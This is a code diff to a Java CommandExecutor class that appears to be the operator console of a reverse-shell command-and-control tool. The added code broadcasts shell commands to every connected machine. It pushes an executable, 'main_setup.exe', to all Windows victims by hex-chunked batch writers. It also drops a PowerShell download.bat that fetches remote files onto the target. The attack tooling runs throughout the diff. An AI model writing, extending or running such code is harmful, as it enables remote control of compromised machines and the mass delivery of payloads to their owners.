@@ -18,11 +18,17 @@ public class CommandExecutor implements Runnable {
         try {
             interpretCommand(command);
         } catch (IOException | InterruptedException e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
     private void interpretCommand(String command) throws IOException, InterruptedException {
+        if(command.length()>1){
+            if(command.charAt(0) != '/'){
+                sendToCurrentConnection();
+                return;
+            }
+        }
         if (command.contains("/sendToAll")) {
             sendToAll();
         } else if (command.contains("/connections")) {
@@ -41,21 +47,24 @@ public class CommandExecutor implements Runnable {
             test();
         } else if (command.contains("/loadTools")) {
             loadTools();
-        }else if(command.contains("/help")){
+        } else if (command.contains("/help")) {
             help();
-        } else {
-            sendToCurrentConnection();
+        } else if (command.contains("/uploadToAll")) {
+            uploadToAll();
+        }else if(command.contains("/clear")){
+            clear();
+        }else if(command.contains("/exit")){
+            exit();
         }
     }
 
     private void test() throws IOException, InterruptedException {
-        connect();
-        command = "cd c:/";
-        sendToCurrentConnection();
+        //connect();
+        command = "cd c:/\n";
+        sendToAll();
 
-        command = "/upload files/main_setup.exe main_setup.exe";
-        upload();
-        //System.out.println("empty");
+        command = "/uploadToAll files/main_setup.exe main_setup.exe";
+        uploadToAll();
     }
 
     private void upload() throws IOException, InterruptedException {
@@ -64,9 +73,20 @@ public class CommandExecutor implements Runnable {
         Data.activeConnection.setBlockOutput(true);
 
         if (Data.activeConnection.getSystemType() == SystemType.type.Windows) {
-            uploadWindows(args.get(0), args.get(1));
+            uploadWindows(args.get(0), args.get(1), Data.activeConnection);
         } else if (Data.activeConnection.getSystemType() == SystemType.type.Linux) {
             uploadLinux(args.get(0), args.get(1));
+        }
+    }
+
+    private void uploadToAll() throws IOException, InterruptedException {
+        List<String> args = getArgs(command);
+
+        for (Connection connection : Data.connections.values()) {
+            if(connection.getId() == Data.lastId-1){
+                connection.setBlockOutput(true);
+            }
+            uploadWindows(args.get(0), args.get(1), connection);
         }
     }
 
@@ -96,8 +116,8 @@ public class CommandExecutor implements Runnable {
         reader.close();
     }
 
-    private void uploadWindows(String fileName, String fileDestination) throws IOException, InterruptedException {
-        Data.activeConnection.getCtx().channel().writeAndFlush("type nul > temp.txt" + "\n");
+    private void uploadWindows(String fileName, String fileDestination, Connection connection) throws IOException, InterruptedException {
+        connection.send("type nul > temp.txt" + "\n");
 
         FileInputStream file = new FileInputStream(fileName);
         BufferedReader reader = new BufferedReader(new InputStreamReader(file));
@@ -111,15 +131,16 @@ public class CommandExecutor implements Runnable {
             if (size >= 1000) {
                 size = 0;
                 String str = bytesToHex(byteBuffer.array());
-                Data.activeConnection.send("writer.bat \"" + str + "\" \n");
+                connection.send("writer.bat \"" + str + "\" \n");
                 byteBuffer = ByteBuffer.allocate(1000);
             }
         }
         if (size > 0) {
             String str = bytesToHex(byteBuffer.array());
-            Data.activeConnection.send("writer.bat \"" + str + "\" \n");
+            connection.send("writer.bat \"" + str + "\" \n");
         }
-        Data.activeConnection.send("create.bat " + fileDestination + "\n");
+        connection.send("create.bat " + fileDestination + "\n");
+        connection.send("!Done\u00ff\n");
         reader.close();
     }
 
@@ -160,7 +181,7 @@ public class CommandExecutor implements Runnable {
 
     private void sendToAll() throws UnsupportedEncodingException, InterruptedException {
         for (Connection connection : Data.connections.values()) {
-            connection.send("EEE OK");
+            connection.send(command);
         }
     }
 
@@ -190,18 +211,18 @@ public class CommandExecutor implements Runnable {
         List<String> args = getArgs(command);
 
         Connection connection;
-        try{
+        try {
             connection = Data.connections.get(args.get(0));
             connection.setPrintOutput(true);
             Data.activeConnection = connection;
             System.out.println("connected to " + args.get(0));
-        }catch (Exception e){
-            try{
+        } catch (Exception e) {
+            try {
                 connection = Data.connections.values().iterator().next();
                 connection.setPrintOutput(true);
                 Data.activeConnection = connection;
                 System.out.println("Connected to the first connection");
-            }catch (Exception ee){
+            } catch (Exception ee) {
                 System.out.println("Lack of connections");
             }
         }
@@ -219,6 +240,7 @@ public class CommandExecutor implements Runnable {
     }
 
     private void loadTools() throws UnsupportedEncodingException, InterruptedException {
+        //load writer.bat
         Data.activeConnection.send("type nul > writer.bat" + "\n");
         Data.activeConnection.send("echo|set /p=\"@echo off\" >> writer.bat" + "\n");
         Data.activeConnection.send("echo. >> writer.bat\n");
@@ -232,23 +254,41 @@ public class CommandExecutor implements Runnable {
         Data.activeConnection.send("echo. >> create.bat\n");
         Data.activeConnection.send("echo del temp.txt >> create.bat\n");
 
+        //load download.bat
+        //Data.activeConnection.send("type nul > download.bat" + "\n");
+        Data.activeConnection.send("echo|set /p=\"powershell -Command \"(New-Object Net.WebClient).DownloadFile('%1', '%2')\"\" > download.bat" + "\n");
         System.out.println("Done!");
     }
 
-    private void help(){
+    private void help() {
         System.out.println("/sendToAll - send massage to all connections");
         System.out.println("/connections - show info about current connections");
         System.out.println("/sendTo - ");
         System.out.println("/showOutput - show connection's output");
         System.out.println("/connect /IP_ADDRESS:PORT - connect to a session");
-        System.out.println("/upload SOURCE_FILE DESTINATION_FILE - upload a file");
+        System.out.println("/upload SOURCE_FILE DESTINATION_FILE - upload a file (slow)");
         System.out.println("/background - hide a current session");
         System.out.println("/test - test");
         System.out.println("/loadModules - load tools, which helps in interaction with windows");
         System.out.println("/help - show commands");
+
+        System.out.println("start download.bat SOURCE_ADDRESS FILENAME - download file (fast)");
     }
 
+    private void clear() throws IOException {
+        System.out.print("\033[H\033[2J");
+        System.out.flush();
+        Runtime.getRuntime().exec("clear");
+        System.out.println("\f");
+    }
+
+    private void exit(){
+        System.exit(0);
+    }
+
+
     private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
+
     private String bytesToHex(byte[] bytes) {
         char[] hexChars = new char[bytes.length * 2];
         for (int j = 0; j < bytes.length; j++) {
